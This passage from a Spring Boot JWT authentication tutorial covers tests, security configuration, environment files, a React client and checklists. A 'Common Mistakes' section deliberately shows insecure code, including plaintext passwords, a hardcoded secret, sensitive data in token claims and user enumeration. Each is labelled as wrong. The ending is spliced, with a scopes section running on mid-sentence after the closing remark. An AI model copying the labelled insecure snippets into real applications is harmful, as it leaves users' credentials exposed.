        assertNotNull(token);
        assertEquals("testuser", jwtService.extractUsername(token));
    }
    
    @Test
    public void testValidateToken_Valid() {
        UserDetails userDetails = User.builder()
            .username("testuser")
            .password("password")
            .authorities(new ArrayList<>())
            .build();
        
        String token = jwtService.generateToken(userDetails);
        
        assertTrue(jwtService.validateToken(token, userDetails));
    }
}
```

---

### 8.2 Integration Tests

**Test Login Endpoint:**
```java
@SpringBootTest
@AutoConfigureMockMvc
public class AuthControllerIntegrationTest {
    
    @Autowired
    private MockMvc mockMvc;
    
    @Autowired
    private ObjectMapper objectMapper;
    
    @Autowired
    private UserRepository userRepository;
    
    @Autowired
    private PasswordEncoder passwordEncoder;
    
    @BeforeEach
    public void setup() {
        userRepository.deleteAll();
        
        User user = new User();
        user.setUsername("testuser");
        user.setEmail("test@example.com");
        user.setPassword(passwordEncoder.encode("Test@123"));
        user.setEnabled(true);
        user.setRoles(Set.of(new Role("ROLE_USER")));
        userRepository.save(user);
    }
    
    @Test
    public void testLogin_Success() throws Exception {
        LoginRequest request = new LoginRequest("testuser", "Test@123");
        
        mockMvc.perform(post("/api/auth/login")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(request)))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.accessToken").exists())
            .andExpect(jsonPath("$.refreshToken").exists());
    }
    
    @Test
    public void testLogin_InvalidCredentials() throws Exception {
        LoginRequest request = new LoginRequest("testuser", "wrongpassword");
        
        mockMvc.perform(post("/api/auth/login")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(request)))
            .andExpect(status().isUnauthorized())
            .andExpect(jsonPath("$.error").value("Invalid username or password"));
    }
    
    @Test
    public void testAccessProtectedEndpoint_WithValidToken() throws Exception {
        // Login first
        LoginRequest loginRequest = new LoginRequest("testuser", "Test@123");
        String response = mockMvc.perform(post("/api/auth/login")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(loginRequest)))
            .andReturn()
            .getResponse()
            .getContentAsString();
        
        String accessToken = objectMapper.readTree(response).get("accessToken").asText();
        
        // Access protected endpoint
        mockMvc.perform(get("/api/users/profile")
                .header("Authorization", "Bearer " + accessToken))
            .andExpect(status().isOk());
    }
    
    @Test
    public void testAccessProtectedEndpoint_WithoutToken() throws Exception {
        mockMvc.perform(get("/api/users/profile"))
            .andExpect(status().isUnauthorized());
    }
}
```

---

## Phase 9: Complete Security Configuration

**Final Security Config Example:**
```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity(prePostEnabled = true)
public class SecurityConfig {
    
    @Autowired
    private JwtAuthenticationFilter jwtAuthFilter;
    
    @Autowired
    private CustomUserDetailsService userDetailsService;
    
    @Autowired
    private AuthenticationEntryPoint authEntryPoint;
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable()) // Disabled for stateless JWT
            
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            
            .authorizeHttpRequests(auth -> auth
                // Public endpoints
                .requestMatchers(
                    "/api/auth/**",
                    "/api/public/**",
                    "/error"
                ).permitAll()
                
                // Admin only
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                
                // Authenticated users
                .anyRequest().authenticated()
            )
            
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            
            .exceptionHandling(ex -> ex
                .authenticationEntryPoint(authEntryPoint)
            )
            
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class)
            
            .headers(headers -> headers
                .frameOptions(frame -> frame.deny())
                .contentTypeOptions(Customizer.withDefaults())
                .xssProtection(xss -> xss.enable())
            );
        
        return http.build();
    }
    
    @Bean
    public AuthenticationManager authenticationManager(AuthenticationConfiguration config) 
            throws Exception {
        return config.getAuthenticationManager();
    }
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder(12);
    }
    
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(List.of("http://localhost:3000"));
        configuration.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS"));
        configuration.setAllowedHeaders(List.of("*"));
        configuration.setAllowCredentials(true);
        configuration.setMaxAge(3600L);
        
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", configuration);
        return source;
    }
}
```

---

## Phase 10: Common Mistakes to Avoid

### ❌ What NOT to do:

1. **Storing passwords in plain text**
   ```java
   user.setPassword(request.getPassword()); // WRONG
   ```

2. **Putting sensitive data in JWT**
   ```java
   claims.put("password", user.getPassword()); // WRONG
   claims.put("ssn", user.getSsn()); // WRONG
   ```

3. **Not validating tokens**
   ```java
   // WRONG - Just extracting without validation
   String username = jwtService.extractUsername(token);
   ```

4. **Using same secret for all environments**
   ```yaml
   # WRONG - Hardcoded secret
   jwt:
     secret: mySecretKey123
   ```

5. **Not handling token expiration**
   ```java
   // WRONG - No refresh token mechanism
   if (jwtService.isTokenExpired(token)) {
       throw new Exception("Token expired"); // User forced to login again
   }
   ```

6. **Exposing stack traces**
   ```java
   // WRONG
   catch (Exception e) {
       return ResponseEntity.badRequest().body(e.getMessage());
   }
   ```

7. **Not rate limiting auth endpoints**
   ```java
   // WRONG - No rate limiting on /login
   ```

8. **Revealing user existence**
   ```java
   // WRONG
   if (!userExists(email)) {
       return "Email not found";
   }
   // CORRECT
   return "If email exists, reset link has been sent";
   ```

---

## Quick Reference Checklist

Before going to production:

- [ ] Passwords hashed with BCrypt/Argon2 (strength 10-12)
- [ ] JWT secret stored in environment variable (not hardcoded)
- [ ] Token expiration implemented (access + refresh)
- [ ] CORS configured for your specific domain (not wildcard)
- [ ] CSRF protection (if using cookies)
- [ ] Rate limiting on auth endpoints (login, register, password reset)
- [ ] Account lockout after failed login attempts
- [ ] Email verification implemented
- [ ] Password reset with expiring tokens
- [ ] HTTPS enforced in production
- [ ] Security headers configured (CSP, XSS, HSTS)
- [ ] Input validation on all endpoints
- [ ] Audit logging for auth events
- [ ] Generic error messages (don't reveal user existence)
- [ ] Token blacklist or version checking for logout
- [ ] Refresh token rotation implemented
- [ ] 2FA option available (optional but recommended)
- [ ] Password strength requirements enforced
- [ ] SQL injection prevention (use parameterized queries)
- [ ] Secrets encrypted at rest in database

---

## Environment Configuration Template

**application-dev.yml:**
```yaml
spring:
  datasource:
    url: jdbc:postgresql://localhost:5432/authdb
    username: dev_user
    password: dev_password
  
  jpa:
    hibernate:
      ddl-auto: update
    show-sql: true
  
  mail:
    host: smtp.gmail.com
    port: 587
    username: ${EMAIL_USERNAME}
    password: ${EMAIL_PASSWORD}
    properties:
      mail:
        smtp:
          auth: true
          starttls:
            enable: true

jwt:
  secret: ${JWT_SECRET}
  expiration: 900000 # 15 minutes
  refresh-expiration: 604800000 # 7 days

app:
  base-url: http://localhost:8080
  frontend-url: http://localhost:3000

cors:
  allowed-origins: http://localhost:3000

logging:
  level:
    org.springframework.security: DEBUG
```

**application-prod.yml:**
```yaml
spring:
  datasource:
    url: ${DATABASE_URL}
    username: ${DATABASE_USERNAME}
    password: ${DATABASE_PASSWORD}
  
  jpa:
    hibernate:
      ddl-auto: validate # Never use update/create in production
    show-sql: false
  
  mail:
    host: ${SMTP_HOST}
    port: ${SMTP_PORT}
    username: ${EMAIL_USERNAME}
    password: ${EMAIL_PASSWORD}

jwt:
  secret: ${JWT_SECRET}
  expiration: 900000
  refresh-expiration: 604800000

app:
  base-url: https://api.yourdomain.com
  frontend-url: https://yourdomain.com

cors:
  allowed-origins: https://yourdomain.com

logging:
  level:
    org.springframework.security: WARN
```

**Environment Variables (.env):**
```bash
# Database
DATABASE_URL=jdbc:postgresql://prod-server:5432/authdb
DATABASE_USERNAME=prod_user
DATABASE_PASSWORD=super_secure_password_here

# JWT
JWT_SECRET=your_very_long_random_secret_key_minimum_256_bits

# Email
EMAIL_USERNAME=noreply@yourdomain.com
EMAIL_PASSWORD=email_app_password

# SMTP
SMTP_HOST=smtp.sendgrid.net
SMTP_PORT=587
```

---

## Complete Project Structure

```
src/main/java/com/yourapp/
├── config/
│   ├── SecurityConfig.java
│   ├── CorsConfig.java
│   ├── MethodSecurityConfig.java
│   └── EmailConfig.java
│
├── controller/
│   ├── AuthController.java
│   ├── UserController.java
│   └── AdminController.java
│
├── dto/
│   ├── request/
│   │   ├── LoginRequest.java
│   │   ├── RegisterRequest.java
│   │   ├── TokenRefreshRequest.java
│   │   └── PasswordResetRequest.java
│   └── response/
│       ├── AuthResponse.java
│       ├── TokenRefreshResponse.java
│       └── UserResponse.java
│
├── entity/
│   ├── User.java
│   ├── Role.java
│   ├── RefreshToken.java
│   ├── VerificationToken.java
│   ├── PasswordResetToken.java
│   └── AuditLog.java
│
├── repository/
│   ├── UserRepository.java
│   ├── RoleRepository.java
│   ├── RefreshTokenRepository.java
│   ├── VerificationTokenRepository.java
│   ├── PasswordResetTokenRepository.java
│   └── AuditLogRepository.java
│
├── security/
│   ├── JwtAuthenticationFilter.java
│   ├── JwtService.java
│   ├── CustomUserDetailsService.java
│   ├── CustomAuthenticationEntryPoint.java
│   └── OAuth2SuccessHandler.java
│
├── service/
│   ├── UserService.java
│   ├── RefreshTokenService.java
│   ├── EmailService.java
│   ├── AuditService.java
│   ├── RateLimitService.java
│   ├── LoginAttemptService.java
│   └── TwoFactorAuthService.java
│
├── exception/
│   ├── GlobalExceptionHandler.java
│   ├── TokenRefreshException.java
│   ├── UserNotFoundException.java
│   └── DuplicateUserException.java
│
└── util/
    ├── SecurityUtils.java
    └── ValidationUtils.java
```

---

## Key Dependencies (pom.xml)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project>
    <dependencies>
        <!-- Spring Boot Starters -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-security</artifactId>
        </dependency>
        
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-data-jpa</artifactId>
        </dependency>
        
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-validation</artifactId>
        </dependency>
        
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-mail</artifactId>
        </dependency>
        
        <!-- OAuth2 (if needed) -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-oauth2-client</artifactId>
        </dependency>
        
        <!-- Database -->
        <dependency>
            <groupId>org.postgresql</groupId>
            <artifactId>postgresql</artifactId>
            <scope>runtime</scope>
        </dependency>
        
        <!-- JWT -->
        <dependency>
            <groupId>io.jsonwebtoken</groupId>
            <artifactId>jjwt-api</artifactId>
            <version>0.11.5</version>
        </dependency>
        <dependency>
            <groupId>io.jsonwebtoken</groupId>
            <artifactId>jjwt-impl</artifactId>
            <version>0.11.5</version>
            <scope>runtime</scope>
        </dependency>
        <dependency>
            <groupId>io.jsonwebtoken</groupId>
            <artifactId>jjwt-jackson</artifactId>
            <version>0.11.5</version>
            <scope>runtime</scope>
        </dependency>
        
        <!-- Rate Limiting -->
        <dependency>
            <groupId>com.github.vladimir-bukhtoyarov</groupId>
            <artifactId>bucket4j-core</artifactId>
            <version>8.1.0</version>
        </dependency>
        
        <!-- 2FA (Optional) -->
        <dependency>
            <groupId>dev.samstevens.totp</groupId>
            <artifactId>totp</artifactId>
            <version>1.7.1</version>
        </dependency>
        
        <!-- Redis for token blacklist (Optional) -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-data-redis</artifactId>
        </dependency>
        
        <!-- Lombok (Optional) -->
        <dependency>
            <groupId>org.projectlombok</groupId>
            <artifactId>lombok</artifactId>
            <optional>true</optional>
        </dependency>
        
        <!-- Testing -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-test</artifactId>
            <scope>test</scope>
        </dependency>
    </dependencies>
</project>
```

---

## API Endpoints Summary

### Public Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/auth/register` | Register new user |
| POST | `/api/auth/login` | Login with credentials |
| POST | `/api/auth/refresh` | Refresh access token |
| POST | `/api/auth/forgot-password` | Request password reset |
| POST | `/api/auth/reset-password` | Reset password with token |
| GET | `/api/auth/verify` | Verify email with token |

### Protected Endpoints (Authenticated)

| Method | Endpoint | Description | Required Role |
|--------|----------|-------------|---------------|
| POST | `/api/auth/logout` | Logout user | Any |
| POST | `/api/auth/logout-all` | Logout all devices | Any |
| GET | `/api/users/profile` | Get user profile | Any |
| PUT | `/api/users/profile` | Update profile | Any |
| POST | `/api/auth/2fa/setup` | Setup 2FA | Any |
| POST | `/api/auth/2fa/verify-setup` | Verify 2FA setup | Any |
| POST | `/api/auth/2fa/disable` | Disable 2FA | Any |
| GET | `/api/users` | List all users | ADMIN |
| DELETE | `/api/users/{id}` | Delete user | ADMIN |

---

## Frontend Integration Examples

### React Example

**AuthContext.js:**
```javascript
import { createContext, useState, useContext, useEffect } from 'react';
import axios from 'axios';

const AuthContext = createContext();

export const useAuth = () => useContext(AuthContext);

export const AuthProvider = ({ children }) => {
    const [user, setUser] = useState(null);
    const [loading, setLoading] = useState(true);

    useEffect(() => {
        checkAuth();
    }, []);

    const checkAuth = async () => {
        const token = localStorage.getItem('accessToken');
        if (token) {
            try {
                const response = await axios.get('/api/users/profile', {
                    headers: { Authorization: `Bearer ${token}` }
                });
                setUser(response.data);
            } catch (error) {
                localStorage.removeItem('accessToken');
                localStorage.removeItem('refreshToken');
            }
        }
        setLoading(false);
    };

    const login = async (username, password) => {
        const response = await axios.post('/api/auth/login', {
            username,
            password
        });
        
        localStorage.setItem('accessToken', response.data.accessToken);
        localStorage.setItem('refreshToken', response.data.refreshToken);
        
        await checkAuth();
        
        return response.data;
    };

    const logout = async () => {
        const token = localStorage.getItem('accessToken');
        try {
            await axios.post('/api/auth/logout', {}, {
                headers: { Authorization: `Bearer ${token}` }
            });
        } catch (error) {
            console.error('Logout error:', error);
        }
        
        localStorage.removeItem('accessToken');
        localStorage.removeItem('refreshToken');
        setUser(null);
    };

    const register = async (username, email, password) => {
        const response = await axios.post('/api/auth/register', {
            username,
            email,
            password
        });
        return response.data;
    };

    return (
        <AuthContext.Provider value={{
            user,
            loading,
            login,
            logout,
            register
        }}>
            {children}
        </AuthContext.Provider>
    );
};
```

**axios-interceptor.js:**
```javascript
import axios from 'axios';

axios.defaults.baseURL = 'http://localhost:8080';

// Request interceptor
axios.interceptors.request.use(
    config => {
        const token = localStorage.getItem('accessToken');
        if (token) {
            config.headers.Authorization = `Bearer ${token}`;
        }
        return config;
    },
    error => Promise.reject(error)
);

// Response interceptor for token refresh
axios.interceptors.response.use(
    response => response,
    async error => {
        const originalRequest = error.config;

        if (error.response?.status === 401 && !originalRequest._retry) {
            originalRequest._retry = true;

            try {
                const refreshToken = localStorage.getItem('refreshToken');
                const response = await axios.post('/api/auth/refresh', {
                    refreshToken
                });

                const { accessToken, refreshToken: newRefreshToken } = response.data;

                localStorage.setItem('accessToken', accessToken);
                localStorage.setItem('refreshToken', newRefreshToken);

                originalRequest.headers.Authorization = `Bearer ${accessToken}`;
                return axios(originalRequest);

            } catch (refreshError) {
                localStorage.clear();
                window.location.href = '/login';
                return Promise.reject(refreshError);
            }
        }

        return Promise.reject(error);
    }
);

export default axios;
```

**Login Component:**
```javascript
import { useState } from 'react';
import { useAuth } from './AuthContext';
import { useNavigate } from 'react-router-dom';

function Login() {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [error, setError] = useState('');
    const { login } = useAuth();
    const navigate = useNavigate();

    const handleSubmit = async (e) => {
        e.preventDefault();
        setError('');

        try {
            await login(username, password);
            navigate('/dashboard');
        } catch (err) {
            setError(err.response?.data?.error || 'Login failed');
        }
    };

    return (
        <form onSubmit={handleSubmit}>
            <input
                type="text"
                placeholder="Username"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                required
            />
            <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
            />
            {error && <div className="error">{error}</div>}
            <button type="submit">Login</button>
        </form>
    );
}
```

**Protected Route:**
```javascript
import { Navigate } from 'react-router-dom';
import { useAuth } from './AuthContext';

function ProtectedRoute({ children, role }) {
    const { user, loading } = useAuth();

    if (loading) {
        return <div>Loading...</div>;
    }

    if (!user) {
        return <Navigate to="/login" />;
    }

    if (role && !user.roles.includes(role)) {
        return <Navigate to="/unauthorized" />;
    }

    return children;
}

// Usage
<Route path="/dashboard" element={
    <ProtectedRoute>
        <Dashboard />
    </ProtectedRoute>
} />

<Route path="/admin" element={
    <ProtectedRoute role="ADMIN">
        <AdminPanel />
    </ProtectedRoute>
} />
```

---

## Troubleshooting Common Issues

### Issue 1: CORS Errors
**Symptom:** Browser console shows CORS policy error

**Solution:**
```java
// Ensure CORS is configured before other filters
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.cors(Customizer.withDefaults()) // Must be first
        .csrf(csrf -> csrf.disable())
        // ... rest of config
}
```

### Issue 2: JWT Token Invalid
**Symptom:** 401 Unauthorized even with valid token

**Solution:**
- Check JWT secret is same in all environments
- Verify token hasn't expired
- Ensure filter is added before UsernamePasswordAuthenticationFilter
- Check token format: "Bearer <token>"

### Issue 3: Password Never Matches
**Symptom:** Login always fails with correct password

**Solution:**
```java
// Make sure you're using the SAME encoder instance
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();
}

// In both registration and authentication
```

### Issue 4: Session Created Despite Stateless Config
**Symptom:** JSESSIONID cookie created

**Solution:**
```java
.sessionManagement(session -> session
    .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
)
```

### Issue 5: 403 Forbidden on Valid Request
**Symptom:** User authenticated but getting 403

**Solution:**
- Check role has correct prefix: "ROLE_ADMIN"
- Verify @PreAuthorize expression syntax
- Enable method security: `@EnableMethodSecurity(prePostEnabled = true)`

---

## Performance Tips

1. **Cache User Details:**
```java
@Cacheable("users")
public User findByUsername(String username) {
    return userRepository.findByUsername(username).orElseThrow();
}
```

2. **Use Connection Pooling:**
```yaml
spring:
  datasource:
    hikari:
      maximum-pool-size: 10
      minimum-idle: 5
```

3. **Async Email Sending:**
```java
@Async
public void sendVerificationEmail(String to, String token) {
    // Email sending logic
}
```

4. **Index Database Columns:**
```java
@Entity
@Table(indexes = {
    @Index(name = "idx_username", columnList = "username"),
    @Index(name = "idx_email", columnList = "email")
})
public class User {
    // ...
}
```

---

## Security Checklist Summary

### Critical (Must Have):
- ✅ Password hashing (BCrypt/Argon2)
- ✅ JWT signature verification
- ✅ Token expiration
- ✅ HTTPS in production
- ✅ Input validation
- ✅ SQL injection prevention

### Important (Should Have):
- ✅ Rate limiting
- ✅ CORS configuration
- ✅ Email verification
- ✅ Password reset flow
- ✅ Audit logging
- ✅ Error handling

### Nice to Have:
- ✅ 2FA/MFA
- ✅ OAuth2 social login
- ✅ Token blacklist
- ✅ Account lockout
- ✅ Session management

---

## Next Steps

1. **Start Simple:** Implement basic username/password authentication with JWT
2. **Add Features Gradually:** Email verification → Password reset → 2FA → OAuth2
3. **Test Thoroughly:** Write unit and integration tests for all auth flows
4. **Security Audit:** Review all endpoints for vulnerabilities before production
5. **Monitor:** Set up logging and monitoring for auth events
6. **Document:** Keep API documentation updated for your team

---

## Useful Resources

- **Spring Security Docs:** https://spring.io/projects/spring-security
- **JWT.io:** https://jwt.io (decode and debug JWTs)
- **OWASP:** https://owasp.org/www-project-top-ten/ (security best practices)
- **Spring Security Architecture:** Understanding filters and authentication flow
- **OAuth2 RFC:** https://tools.ietf.org/html/rfc6749

---

**Remember:** Security is not a feature you add at the end. Build it in from the start, test it thoroughly, and keep it updated. Add scopes to JWT:**
```java
public String generateToken(User user) {
    Map<String, Object> claims = new HashMap<>();
    
    // Add scopes based on user roles/permissions
    List<String> scopes = determineScopes(user);
    claims.put("scopes", scopes);
    claims.put("sub", user.getUsername());
    
    return Jwts.builder()
        .setClaims(claims)
        .setIssuedAt(new Date())
        .setExpiration(new Date(System.currentTimeMillis() + 900000))
        .signWith(SignatureAlgorithm.HS256, SECRET_KEY)
        .compact();
}

private List<String> determineScopes(User user) {
    List<String> scopes = new ArrayList<>();
    
    if (user.hasRole("ADMIN")) {
        scopes.addAll(List.of(
            "read:posts:all", "write:posts:all", "delete:posts:all",
            "read:users:all", "write:users:all"
        ));
    } else if (user.hasRole("EDITOR")) {
        scopes.addAll(List.of(
            "read:posts:all", "write:posts:own", "delete:posts:own"
        ));
    } else {
        scopes.add("read:posts:all");
    }
    
    return scopes;
}
```

**2. Check scopes in controller:**
```java
@RestController
@RequestMapping("/api/posts")
public class PostController {
    
    @PreAuthorize("hasAuthority('SCOPE_write:posts:all') or " +
                  "hasAuthority('SCOPE_write:posts:own')")
    @PostMapping
    public ResponseEntity<?> createPost(@RequestBody PostDTO post, 
                                        Authentication auth) {
        
        // If user has only write:posts:own, set author to current user
        if (hasScope(auth, "write:posts:own") && 
            !hasScope(auth, "write:posts:all")) {
            post.setAuthor(auth.getName());
        }
        
        return ResponseEntity.ok(postService.create(post));
    }
    
    private boolean hasScope(Authentication auth, String scope) {
        return auth.getAuthorities().stream()
            .anyMatch(a -> a.getAuthority().equals("SCOPE_" + scope));
    }
}
```

**3. Extract scopes from JWT:**
```java
public List<String> extractScopes(String token) {
    Claims claims = extractAllClaims(token);
    return claims.get("scopes", List.class);
}

// In JWT filter, convert scopes to authorities
List<String> scopes = jwtService.extractScopes(token);
List<GrantedAuthority> authorities = scopes.stream()
    .map(scope -> new SimpleGrantedAuthority("SCOPE_" + scope))
    .collect(Collectors.toList());
```

**Benefits of Scopes:**
- More granular than roles
- Easy to request subset of permissions (mobile app might request fewer scopes)
- Clear API contracts (API documentation lists required scopes)
- Works well with OAuth2 and third-party integrations

---

